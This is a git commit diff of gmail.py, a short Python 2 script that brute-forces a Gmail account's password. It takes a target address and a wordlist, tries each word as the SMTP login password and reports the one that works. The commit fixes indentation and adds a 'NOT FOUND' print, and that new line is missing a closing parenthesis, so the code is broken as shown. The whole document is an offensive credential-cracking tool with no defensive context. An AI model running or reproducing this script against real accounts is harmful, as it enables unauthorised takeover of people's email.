7fdefe3f8e34f4c10835bce7d69d579f2ecf76cd
U-MYTEST <72102810+U-MYTEST@users.noreply.github.com>
2021-02-10 10:52:18 +0100

    Update gmail.py

--- gmail.py
+++ gmail.py
@@ -4,9 +4,12 @@ smtpserver.ehlo()
 smtpserver.starttls()
 
 user=raw_input("Enter gmail: ")
-passwfile=raw_input("Enter wordlists")                          passwfile=open(passwfile,"r")
-for password in passwfile:                                              try:
-                smtpserver.login(user, password)
-                print "[*] password found: %s" % password
-                break;
-        except smtplib.SMTPAuthenticationError:
+passwfile=raw_input("Enter wordlists")                          
+passwfile=open(passwfile,"r")
+for password in passwfile:                                              
+    try:
+       smtpserver.login(user, password)
+       print "[*] password found: %s" % password
+       break;
+    except smtplib.SMTPAuthenticationError:
+       print("NOT FOUND: %s" % password
